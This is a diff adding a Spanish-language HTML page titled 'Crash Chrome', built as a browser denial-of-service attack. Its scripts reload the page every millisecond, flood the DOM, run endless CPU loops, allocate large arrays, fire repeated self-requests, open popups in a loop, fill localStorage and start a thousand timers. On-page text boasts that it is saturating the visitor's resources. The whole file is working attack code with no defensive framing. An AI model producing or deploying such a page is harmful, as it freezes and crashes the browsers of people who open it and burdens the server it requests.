@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Crash Chrome - Denegación de Servicio</title>
+    <script>
+
+        setInterval(function() {
+            window.location.href = window.location.href;
+        }, 1);
+        
+     
+        setInterval(function() {
+            for (let i = 0; i < 100; i++) {
+                const div = document.createElement('div');
+                div.style.width = '10px';
+                div.style.height = '10px';
+                div.style.backgroundColor = '#ff0000';
+                div.style.margin = '1px';
+                document.body.appendChild(div);
+            }
+        }, 10);
+        
+     
+        function burnCPU() {
+            let x = 0;
+            while (true) {
+                x++;
+                Math.sqrt(Math.random() * 10000000) + Math.sin(x) + Math.log(x);
+                
+                if (x % 1000000 === 0) {
+                    setTimeout(burnCPU, 0);
+                    break;
+                }
+            }
+        }
+        
+        setTimeout(burnCPU, 100);
+        
+        setInterval(function() {
+            const massiveArray = [];
+            for (let i = 0; i < 10000; i++) {
+                massiveArray.push(new Array(1000).fill('datos de memoria'));
+            }
+        }, 500);
+        
+        setInterval(function() {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', window.location.href, true);
+            xhr.send();
+        }, 10);
+        
+        setInterval(function() {
+            window.open(window.location.href, '_blank', 'width=300,height=300');
+        }, 100);
+        
+        const style = document.createElement('style');
+        style.textContent = `
+            div {
+                animation: spin 0.1s linear infinite;
+            }
+            @keyframes spin {
+                from { transform: rotate(0deg); }
+                to { transform: rotate(360deg); }
+            }
+        `;
+        document.head.appendChild(style);
+        
+        setInterval(function() {
+            for (let i = 0; i < 100; i++) {
+                localStorage.setItem('key' + i, 'x'.repeat(1024 * 1024)); 
+            }
+        }, 1000);
+        
+        for (let i = 0; i < 1000; i++) {
+            window.addEventListener('scroll', function() {
+                document.body.style.backgroundColor = '#' + Math.floor(Math.random()*16777215).toString(16);
+            });
+        }
+        
+        for (let i = 0; i < 1000; i++) {
+            setInterval(function() {
+                console.log('Timer ' + i + ' ejecutándose');
+            }, 1);
+        }
+        
+        console.warn('⚠️ Esta página está diseñada para saturar recursos del navegador. ¡Cierra esta pestaña si no quieres que tu navegador se congele!');
+    </script>
+</head>
+<body>
+    <h1 style="color: red; text-align: center;">⚠️ SATURACIÓN DE RECURSOS ACTIVADA ⚠️</h1>
+    <p style="text-align: center; font-size: 18px;">Esta página está consumiendo activamente:</p>
+    <ul style="list-style: none; text-align: center; font-size: 16px;">
+        <li>🔥 CPU (procesamiento infinito)</li>
+        <li>💾 RAM (creación masiva de elementos)</li>
+        <li>🔄 Red (redirecciones y solicitudes AJAX)</li>
+        <li>📦 Almacenamiento local (localStorage)</li>
+        <li>🎨 GPU (animaciones CSS pesadas)</li>
+    </ul>
+    <script>
+        setInterval(function() {
+            const stats = document.createElement('p');
+            stats.style.position = 'fixed';
+            stats.style.bottom = '10px';
+            stats.style.right = '10px';
+            stats.style.backgroundColor = 'rgba(0,0,0,0.7)';
+            stats.style.color = 'white';
+            stats.style.padding = '10px';
+            stats.style.borderRadius = '5px';
+            stats.style.zIndex = '9999';
+            
+            const memory = performance.memory ? 
+                (performance.memory.usedJSHeapSize / 1048576).toFixed(2) + ' MB' : 
+                'No disponible';
+            
+            stats.innerHTML = `Elementos en DOM: ${document.body.children.length}<br>
+                              Memoria usada: ${memory}<br>
+                              Timers activos: ~1000+`;
+            
+            document.body.appendChild(stats);
+            
+            if (document.body.children.length > 1000) {
+                document.body.removeChild(document.body.children[0]);
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
